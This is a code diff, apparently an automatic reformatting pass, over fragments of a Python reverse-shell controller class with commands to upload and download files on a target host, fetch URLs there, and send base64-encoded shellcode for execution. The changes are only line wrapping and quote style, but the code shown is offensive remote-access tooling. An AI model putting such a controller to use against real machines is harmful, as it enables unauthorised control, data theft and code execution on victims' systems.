@@ -129,8 +129,7 @@ def is_filepath(filename: str, is_windows: bool = None) -> Union[bool, None]:
     ):
         return False
     elif any(
-        x
-        not in "0123456789abcdefghijklmnopqrstuvwx"
+        x not in "0123456789abcdefghijklmnopqrstuvwx"
         "yzABCDEFGHIJKLMNOPQRSTUVWXYZ-./_\\:"
         for x in filename
     ):
@@ -259,14 +258,18 @@ class ReverseShell(Cmd, BaseRequestHandler):
         self.__class__.hostname = hostname = data.get(
             "hostname", getattr(self, "hostname", self.client_address[0])
         )
-        self.__class__.user = user = data.get("user", getattr(self, "user", "user"))
+        self.__class__.user = user = data.get(
+            "user", getattr(self, "user", "user")
+        )
         self.__class__.current_directory = cwd = data.get(
             "cwd", getattr(self, "current_directory", "~")
         )
         self.__class__.target_system = system = data.get(
             "system", getattr(self, "target_system", platform())
         )
-        self.__class__.target_is_windows = is_windows = system.casefold() == "windows"
+        self.__class__.target_is_windows = is_windows = (
+            system.casefold() == "windows"
+        )
         encoding = data.get("encoding")
         compression = data.get("commpression")
 
@@ -642,7 +645,13 @@ class ReverseShell(Cmd, BaseRequestHandler):
         else:
             data = self.encode(file.read())
         file.close()
-        self.default("upload_file" + ("_compress " if compress else " ") + shellquote(arguments[1]) + " " + data.decode("latin-1"))
+        self.default(
+            "upload_file"
+            + ("_compress " if compress else " ")
+            + shellquote(arguments[1])
+            + " "
+            + data.decode("latin-1")
+        )
         return False
 
     def do_upload_file_compress(self, argument: str) -> bool:
@@ -657,7 +666,7 @@ class ReverseShell(Cmd, BaseRequestHandler):
         This method is used for download file commands.
         """
 
-        with open(self.download_filename, 'wb') as file:
+        with open(self.download_filename, "wb") as file:
             file.write(self.decode(data.encode()))
 
         print("done")
@@ -728,7 +737,9 @@ class ReverseShell(Cmd, BaseRequestHandler):
                 file=stderr,
             )
             printf(
-                "USAGE: download_url [URL] (optional:filename)", state="INFO", file=stderr
+                "USAGE: download_url [URL] (optional:filename)",
+                state="INFO",
+                file=stderr,
             )
             self.cmdloop()
         elif not url.netloc or not url.scheme:
@@ -738,14 +749,20 @@ class ReverseShell(Cmd, BaseRequestHandler):
                 file=stderr,
             )
             self.cmdloop()
-        elif arguments_length == 2 and is_filepath(arguments[1], self.target_is_windows) is False:
+        elif (
+            arguments_length == 2
+            and is_filepath(arguments[1], self.target_is_windows) is False
+        ):
             printf(
                 "Invalid filename detected for 'download_url' command.",
                 state="ERROR",
                 file=stderr,
             )
             self.cmdloop()
-        elif arguments_length == 2 and is_filepath(arguments[1], self.target_is_windows) is None:
+        elif (
+            arguments_length == 2
+            and is_filepath(arguments[1], self.target_is_windows) is None
+        ):
             printf(
                 "Probably invalid filename detected for 'download_url'"
                 " command.",
@@ -893,11 +910,14 @@ class ReverseShell(Cmd, BaseRequestHandler):
             if compress:
                 self.default(
                     "shellcode_compress "
-                    + self.encode(self.compress(b64decode(argument.encode()))).decode()
+                    + self.encode(
+                        self.compress(b64decode(argument.encode()))
+                    ).decode()
                 )
             else:
                 self.default(
-                    "shellcode " + self.encode(b64decode(argument.encode())).decode()
+                    "shellcode "
+                    + self.encode(b64decode(argument.encode())).decode()
                 )
         return False
 
